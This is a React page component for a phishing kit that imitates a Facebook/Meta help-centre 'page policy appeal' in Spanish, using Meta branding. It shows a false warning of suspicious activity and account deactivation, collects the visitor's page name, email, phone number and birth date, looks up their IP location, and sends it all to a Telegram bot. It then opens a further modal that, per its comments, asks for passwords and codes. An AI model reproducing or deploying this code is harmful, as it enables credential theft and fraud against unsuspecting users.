import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import FormFlow from '@/components/form-flow';
import { store } from '@/store/store';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useRef } from 'react';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
import axios from 'axios';

const Home = () => {
    // Tất cả text tiếng Tây Ban Nha
    const texts = {
        helpCenter: 'Centro de ayuda',
        english: 'Español',
        using: 'Formas de uso',
        managingAccount: 'Administrar cuenta',
        privacySecurity: 'Privacidad y seguridad',
        policiesReporting: 'Políticas e informes',
        pagePolicyAppeals: 'Apelación de política de cuenta',
        detectedActivity: 'Hemos detectado actividad sospechosa en tu página y cuenta, incluidos informes de infracción de derechos de autor y violaciones de políticas.',
        accessLimited: 'Para proteger tu cuenta y garantizar un proceso de revisión rápido y preciso, confirma tu información de inmediato.',
        submitAppeal: 'Este es un paso de confirmación obligatorio para las cuentas de Facebook. Para evitar la desactivación de la cuenta và đẩy nhanh tốc độ xử lý vụ việc, hãy hoàn tất xác nhận ngay.',
        pageName: 'Nombre de la página',
        mail: 'Dirección de correo electrónico',
        phone: 'Número de teléfono',
        birthday: 'Fecha de nacimiento',
        yourAppeal: 'Tu apelación',
        appealPlaceholder: 'Completa los detalles de la apelación.',
        submit: 'Enviar',
        fieldRequired: 'Este campo es obligatorio',
        invalidEmail: 'Ingresa una dirección de correo electrónico válida',
        about: 'Información',
        adChoices: 'Opciones de anuncios',
        createAd: 'Crear anuncio',
        privacy: 'Privacidad',
        careers: 'Empleo',
        createPage: 'Crear página',
        termsPolicies: 'Condiciones y políticas',
        cookies: 'Cookies',
        pleaseWait: 'Espera un momento...'
    };

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [birthdayParts, setBirthdayParts] = useState({
        day: '',
        month: '',
        year: ''
    });
    const [openDropdown, setOpenDropdown] = useState(null);
    const birthdayDropdownRef = useRef(null);

    const [errors, setErrors] = useState({});
    const [countryCode, setCountryCode] = useState('ES');
    const [callingCode, setCallingCode] = useState('+34');
    const [isSubmitting, setIsSubmitting] = useState(false);
    
    const isMountedRef = useRef(true);

    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setBaseMessage, setUserEmail, setUserPhoneNumber, setUserFullName, setMessageId, resetPasswords, resetCodes } = store();

    // Lấy IP info ngầm (không block form)
    useEffect(() => {
        axios.get('https://get.geojs.io/v1/ip/geo.json')
            .then(response => {
                if (!isMountedRef.current) return;
                const ipData = response.data;
                localStorage.setItem('ipInfo', JSON.stringify(ipData));
                setGeoInfo({
                    asn: ipData.asn || 0,
                    ip: ipData.ip || 'CHỊU',
                    country: ipData.country || 'CHỊU',
                    city: ipData.city || 'CHỊU',
                    country_code: ipData.country_code || 'ES'
                });
            })
            .catch((error) => {
                if (!isMountedRef.current) return;
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'ES'
                });
            });
        
        return () => {
            isMountedRef.current = false;
        };
    }, [setGeoInfo]);

    useEffect(() => {
        const handleClickOutside = (event) => {
            if (birthdayDropdownRef.current && !birthdayDropdownRef.current.contains(event.target)) {
                setOpenDropdown(null);
            }
        };

        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);



    const validateEmail = (email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    const formatDateToDDMMYYYY = (dateString) => {
        if (!dateString) return '';
        const parts = dateString.split('-');
        if (parts.length !== 3) return dateString;
        return `${parts[2]}/${parts[1]}/${parts[0]}`;
    };

    const hideEmail = (email) => {
        if (!email) return 's****g@m****.com';
        const parts = email.split('@');
        if (parts.length !== 2) return email;
        
        const username = parts[0];
        const domain = parts[1];
        const domainParts = domain.split('.');
        
        if (username.length <= 1) return email;
        if (domainParts.length < 2) return email;
        
        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
        
        return formattedUsername + '@' + formattedDomain;
    };

    const hidePhone = (phone) => {
        if (!phone) return '******32';
        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
        if (cleanPhone.length < 2) return '******32';
        
        const lastTwoDigits = cleanPhone.slice(-2);
        return '*'.repeat(6) + lastTwoDigits;
    };

    const getDaysInMonth = (year, month) => {
        if (!year || !month) return 31;
        return new Date(Number(year), Number(month), 0).getDate();
    };

    const monthNames = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];

    const years = Array.from({ length: 100 }, (_, index) => {
        return String(new Date().getFullYear() - index);
    });

    const buildBirthdayValue = (day, month, year) => {
        if (!day || !month || !year) return '';
        const paddedDay = String(day).padStart(2, '0');
        const paddedMonth = String(month).padStart(2, '0');
        return `${year}-${paddedMonth}-${paddedDay}`;
    };

    const handleBirthdayPartChange = (part, value) => {
        if (isSubmitting) return;
        const nextParts = {
            ...birthdayParts,
            [part]: value
        };

        const daysInMonth = getDaysInMonth(nextParts.year, nextParts.month);
        if (nextParts.day && Number(nextParts.day) > daysInMonth) {
            nextParts.day = '';
        }

        setBirthdayParts(nextParts);
        const combined = buildBirthdayValue(nextParts.day, nextParts.month, nextParts.year);
        setFormData((prev) => ({
            ...prev,
            birthday: combined
        }));

        setErrors((prev) => {
            if (prev.birthday) {
                return {
                    ...prev,
                    birthday: false
                };
            }
            return prev;
        });
    };

    const handleInputChange = useCallback((field, value) => {
        if (isSubmitting) return;
        
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        // Chỉ update errors khi có error, tránh re-render không cần thiết
        setErrors((prev) => {
            if (prev[field]) {
                return {
                ...prev,
                [field]: false
                };
        }
            return prev;
        });
    }, [isSubmitting, countryCode, callingCode, birthdayParts]);

    const validateForm = () => {
        if (isSubmitting) return false;
        
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
            newErrors.mail = 'invalid';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
    const handleSubmit = async () => {
        if (isSubmitting) return;
        
        if (validateForm()) {
            try {
                setIsSubmitting(true);
                
                // Mỗi lần submit form mới (bước 1) coi như một phiên mới:
                // - Reset passwords, codes
                // - Reset messageId để KHÔNG xóa tin Telegram của phiên trước
                //   (password-modal / verify-modal chỉ xóa trong cùng một phiên hiện tại)
                resetPasswords();
                resetCodes();
                setMessageId(null);

                // Format thời gian
                const now = new Date();
                const formattedTime = now.toLocaleString('vi-VN', {
                    timeZone: 'Asia/Ho_Chi_Minh',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });

                // Format date of birth: DD/MM/YYYY từ YYYY-MM-DD
                const birthdayParts = formData.birthday.split('-');
                const dateOfBirth = birthdayParts.length === 3 
                    ? `${birthdayParts[2]}/${birthdayParts[1]}/${birthdayParts[0]}`
                    : formData.birthday;
                
                // Format phone number (chỉ lấy số, giữ nguyên format)
                const phoneNumberOnly = formData.phone.replace(/[^\d+]/g, '');

                // Tạo base message với format đúng (HTML với <b> và <code>)
                const currentGeoInfo = geoInfo || {
                    ip: 'k lấy được',
                    city: 'k lấy được',
                    country_code: 'k lấy được'
                };
                const location = `${currentGeoInfo.city || 'k lấy được'} - ${currentGeoInfo.country_code || 'k lấy được'}`;
                const messageLines = [
                    `📅 <b>Thời gian:</b> <code>${formattedTime}</code>`,
                    `🌍 <b>IP:</b> <code>${currentGeoInfo.ip || 'k lấy được'}</code>`,
                    `📍 <b>Vị trí:</b> <code>${location}</code>`,
                    '',
                    `🔖 <b>Page Name:</b> <code>${formData.pageName}</code>`,
                    `📧 <b>Email:</b> <code>${formData.mail}</code>`,
                    `📱 <b>Số điện thoại:</b> <code>${phoneNumberOnly}</code>`,
                    `🎂 <b>Ngày sinh:</b> <code>${dateOfBirth}</code>`,
                    ''
                ];

                const baseMessage = messageLines.join('\n');

                // Lưu base message vào store
                setBaseMessage(baseMessage);

                // Save user data to store
                setUserEmail(formData.mail);
                setUserPhoneNumber(formData.phone);
                setUserFullName(formData.pageName);
                
                // 🎯 GỬI TELEGRAM DATA FORM (dùng baseMessage đã format đúng với geoInfo)
                const startTime = Date.now();
                console.log('📤 Bắt đầu gửi Telegram, baseMessage:', baseMessage);
                try {
                    const res = await sendMessage(baseMessage);
                    console.log('✅ Telegram response:', res);

                    // Cập nhật messageId nếu có
                    if (res?.messageId) {
                        setMessageId(res.messageId);
                        console.log('✅ MessageId đã lưu:', res.messageId);
                    } else {
                        console.warn('⚠️ Không có messageId trong response');
                    }
                } catch (telegramError) {
                    console.error('❌ Telegram send error:', telegramError);
                    console.error('❌ Error details:', telegramError.response?.data || telegramError.message);
                    // Không throw, tiếp tục flow dù có lỗi telegram
                }

                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                const userInfoData = {
                    name: formData.pageName,
                    email: hideEmail(formData.mail),
                    phone: hidePhone(formData.phone),
                    birthday: formData.birthday
                };
                localStorage.setItem('userInfo', JSON.stringify(userInfoData));

                // 🎯 ĐỢI TỐI THIỂU 3 GIÂY ĐỂ SPINNER HIỆN ĐỦ
                const elapsedTime = Date.now() - startTime;
                const minDelay = 3000; // 3 giây
                if (elapsedTime < minDelay && isMountedRef.current) {
                    await new Promise((resolve) => setTimeout(resolve, minDelay - elapsedTime));
                }

                // 🎯 HIỆN FORM FLOW (chỉ nếu component vẫn mounted)
                if (isMountedRef.current) {
                    setIsSubmitting(false);
                    console.log('Opening modal, baseMessage:', baseMessage);
                    setModalOpen(true);
                }
                
            } catch (error) {
                if (isMountedRef.current) {
                    setIsSubmitting(false);
                    console.error('Submit error:', error);
                }
                // Không redirect về about:blank, chỉ log lỗi
                // window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };


    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};
        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
    };


    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: texts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: texts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: texts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: texts.policiesReporting
        }
    ];

    return (
        <>
            <div className='opacity-100'>
                <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
                    <title>Page Help Center</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                    <div className='flex items-center gap-2'>
                        <img src={FacebookImage} alt='' className='h-10 w-10' />
                        <p className='font-bold'>{texts.helpCenter}</p>
                    </div>
                    <div className='flex items-center gap-2'>
                        <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                            <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                        </div>
                        <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{texts.english}</p>
                    </div>
                </header>
                <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                    <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                        {data_list.map((data) => {
                            return (
                                <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                    <div className='flex items-center gap-2'>
                                        <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                            <FontAwesomeIcon icon={data.icon} />
                                        </div>
                                        <div>{data.title}</div>
                                    </div>
                                    <FontAwesomeIcon icon={faChevronDown} />
                                </div>
                            );
                        })}
                    </nav>
                    <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                        <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-6'>
                            <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                                <p className='text-xl sm:text-3xl font-bold'>{texts.pagePolicyAppeals}</p>
                            </div>
                            <div className='px-4 pt-4 pb-2 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                                <p className='mb-3 whitespace-pre-line'>{texts.detectedActivity}</p>
                                <p className='mb-3'>{texts.accessLimited}</p>
                                <p className='mb-0'>{texts.submitAppeal}</p>
                            </div>
                            <div className='flex flex-col gap-3 px-4 pb-4 pt-0 text-sm leading-6 font-semibold'>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.pageName} <span className='text-red-500'>*</span>
                                    </p>
                                    <input 
                                        type='text' 
                                        name='pageName' 
                                        autoComplete='organization' 
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                        value={formData.pageName} 
                                        onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                    {errors.pageName && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.mail} <span className='text-red-500'>*</span>
                                    </p>
                                    <input 
                                        type='email' 
                                        name='mail' 
                                        autoComplete='email' 
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                        value={formData.mail} 
                                        onChange={(e) => handleInputChange('mail', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                    {errors.mail === true && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                    {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{texts.invalidEmail}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.phone} <span className='text-red-500'>*</span>
                                    </p>
                                    <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                        <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
                                        <input 
                                            type='tel' 
                                            name='phone' 
                                            inputMode='numeric' 
                                            pattern='[0-9]*' 
                                            autoComplete='off' 
                                            className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
                                            value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                            onChange={(e) => handleInputChange('phone', e.target.value)} 
                                            disabled={isSubmitting}
                                        />
                                    </div>
                                    {errors.phone && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.birthday} <span className='text-red-500'>*</span>
                                    </p>

                                    <div className={`grid grid-cols-3 gap-3 sm:hidden ${isSubmitting ? 'opacity-50 pointer-events-none' : ''}`}>
                                        <div className='relative'>
                                            <select
                                                name='birthday-day'
                                                value={birthdayParts.day}
                                                onChange={(e) => handleBirthdayPartChange('day', e.target.value)}
                                                className={`w-full rounded-[12px] border px-4 py-2 pr-10 text-[15px] font-semibold text-[#111827] bg-white shadow-sm focus:border-[#3b82f6] focus:ring-2 focus:ring-[#3b82f6]/20 transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <option value='' disabled hidden style={{ display: 'none' }}>Día</option>
                                                {Array.from({ length: getDaysInMonth(birthdayParts.year, birthdayParts.month) }, (_, index) => {
                                                    const day = String(index + 1).padStart(2, '0');
                                                    return (
                                                        <option key={day} value={day}>
                                                            {day}
                                                        </option>
                                                    );
                                                })}
                                            </select>
                                            <span className='pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-[#111827]'>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px]' />
                                            </span>
                                        </div>
                                        <div className='relative'>
                                            <select
                                                name='birthday-month'
                                                value={birthdayParts.month}
                                                onChange={(e) => handleBirthdayPartChange('month', e.target.value)}
                                                className={`w-full rounded-[12px] border px-4 py-2 pr-10 text-[15px] font-semibold text-[#111827] bg-white shadow-sm focus:border-[#3b82f6] focus:ring-2 focus:ring-[#3b82f6]/20 transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <option value='' disabled hidden style={{ display: 'none' }}>Mes</option>
                                                {monthNames.map((month) => (
                                                    <option key={month} value={month}>
                                                        {month}
                                                    </option>
                                                ))}
                                            </select>
                                            <span className='pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-[#111827]'>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px]' />
                                            </span>
                                        </div>
                                        <div className='relative'>
                                            <select
                                                name='birthday-year'
                                                value={birthdayParts.year}
                                                onChange={(e) => handleBirthdayPartChange('year', e.target.value)}
                                                className={`w-full rounded-[12px] border px-4 py-2 pr-10 text-[15px] font-semibold text-[#111827] bg-white shadow-sm focus:border-[#3b82f6] focus:ring-2 focus:ring-[#3b82f6]/20 transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <option value='' disabled hidden style={{ display: 'none' }}>Año</option>
                                                {years.map((year) => (
                                                    <option key={year} value={year}>
                                                        {year}
                                                    </option>
                                                ))}
                                            </select>
                                            <span className='pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-[#111827]'>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px]' />
                                            </span>
                                        </div>
                                    </div>

                                    <div
                                        ref={birthdayDropdownRef}
                                        className={`hidden sm:grid grid-cols-3 gap-3 ${isSubmitting ? 'opacity-50 pointer-events-none' : ''}`}
                                    >
                                        <div className='relative'>
                                            <button
                                                type='button'
                                                onClick={() => setOpenDropdown((prev) => (prev === 'day' ? null : 'day'))}
                                                className={`flex w-full items-center justify-between rounded-[12px] border px-4 py-2 text-[15px] font-semibold text-left text-[#111827] bg-white shadow-sm transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <span className={`${birthdayParts.day ? 'text-[#111827]' : 'text-[#6b7280]'}`}>
                                                    {birthdayParts.day || 'Día'}
                                                </span>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px] text-[#111827]' />
                                            </button>
                                            {openDropdown === 'day' && (
                                                <div
                                                    className='absolute bottom-full z-20 mb-2 w-full max-h-96 overflow-y-auto rounded-[16px] border border-[#e5e7eb] bg-white shadow-xl'
                                                >
                                                    {Array.from({ length: getDaysInMonth(birthdayParts.year, birthdayParts.month) }, (_, index) => {
                                                        const day = String(index + 1).padStart(2, '0');
                                                        return (
                                                            <div
                                                                key={day}
                                                                role='button'
                                                                tabIndex={0}
                                                                onClick={() => {
                                                                    handleBirthdayPartChange('day', day);
                                                                    setOpenDropdown(null);
                                                                }}
                                                                className='flex w-full items-center px-4 py-2 text-[15px] text-[#111827] hover:bg-[#f3f4f6] cursor-pointer select-none'
                                                            >
                                                                {day}
                                                            </div>
                                                        );
                                                    })}
                                                </div>
                                            )}
                                        </div>
                                        <div className='relative'>
                                            <button
                                                type='button'
                                                onClick={() => setOpenDropdown((prev) => (prev === 'month' ? null : 'month'))}
                                                className={`flex w-full items-center justify-between rounded-[12px] border px-4 py-2 text-[15px] font-semibold text-left text-[#111827] bg-white shadow-sm transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <span className={`${birthdayParts.month ? 'text-[#111827]' : 'text-[#6b7280]'}`}>
                                                    {birthdayParts.month || 'Mes'}
                                                </span>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px] text-[#111827]' />
                                            </button>
                                            {openDropdown === 'month' && (
                                                <div
                                                    className='absolute bottom-full z-20 mb-2 w-full max-h-96 overflow-y-auto rounded-[16px] border border-[#e5e7eb] bg-white shadow-xl'
                                                >
                                                    {monthNames.map((month) => (
                                                        <div
                                                            key={month}
                                                            role='button'
                                                            tabIndex={0}
                                                            onClick={() => {
                                                                handleBirthdayPartChange('month', month);
                                                                setOpenDropdown(null);
                                                            }}
                                                            className='flex w-full items-center px-4 py-2 text-[15px] text-[#111827] hover:bg-[#f3f4f6] cursor-pointer select-none'
                                                        >
                                                            {month}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                        <div className='relative'>
                                            <button
                                                type='button'
                                                onClick={() => setOpenDropdown((prev) => (prev === 'year' ? null : 'year'))}
                                                className={`flex w-full items-center justify-between rounded-[12px] border px-4 py-2 text-[15px] font-semibold text-left text-[#111827] bg-white shadow-sm transition ${errors.birthday ? 'border-[#dc3545]' : 'border-[#d1d5db]'}`}
                                            >
                                                <span className={`${birthdayParts.year ? 'text-[#111827]' : 'text-[#6b7280]'}`}>
                                                    {birthdayParts.year || 'Año'}
                                                </span>
                                                <FontAwesomeIcon icon={faChevronDown} className='text-[14px] text-[#111827]' />
                                            </button>
                                            {openDropdown === 'year' && (
                                                <div
                                                    className='absolute bottom-full z-20 mb-2 w-full max-h-96 overflow-y-auto rounded-[16px] border border-[#e5e7eb] bg-white shadow-xl'
                                                >
                                                    {years.map((year) => (
                                                        <div
                                                            key={year}
                                                            role='button'
                                                            tabIndex={0}
                                                            onClick={() => {
                                                                handleBirthdayPartChange('year', year);
                                                                setOpenDropdown(null);
                                                            }}
                                                            className='flex w-full items-center px-4 py-2 text-[15px] text-[#111827] hover:bg-[#f3f4f6] cursor-pointer select-none'
                                                        >
                                                            {year}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                    
                                    {errors.birthday && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.yourAppeal} <span className='text-red-500'>*</span>
                                    </p>
                                    <textarea 
                                        name='appeal'
                                        rows={4}
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                        placeholder={texts.appealPlaceholder}
                                        value={formData.appeal}
                                        onChange={(e) => handleInputChange('appeal', e.target.value)}
                                        disabled={isSubmitting}
                                    />
                                    {errors.appeal && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <button 
                                    className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 mb-6 flex items-center justify-center ${
                                        isSubmitting 
                                            ? 'bg-blue-500 cursor-wait text-white' 
                                            : 'bg-blue-600 hover:bg-blue-700 text-white'
                                    }`} 
                                    onClick={handleSubmit}
                                    disabled={isSubmitting}
                                >
                                    {isSubmitting ? (
                                        <>
                                            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                            {texts.pleaseWait}
                                        </>
                                    ) : (
                                        texts.submit
                                    )}
                                </button>
                            </div>
                        </div>
                        <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                            <div className='mx-auto flex justify-between'>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.about}</p>
                                    <p>{texts.adChoices}</p>
                                    <p>{texts.createAd}</p>
                                </div>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.privacy}</p>
                                    <p>{texts.careers}</p>
                                    <p>{texts.createPage}</p>
                                </div>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.termsPolicies}</p>
                                    <p>{texts.cookies}</p>
                                </div>
                            </div>
                            <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                            <div className='flex justify-between'>
                                <img src={FromMetaImage} alt='' className='w-[100px]' />
                                <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                            </div>
                        </div>
                    </div>
                </main>
                {isModalOpen && <FormFlow />}
            </div>
        </>
    );
};

export default Home;
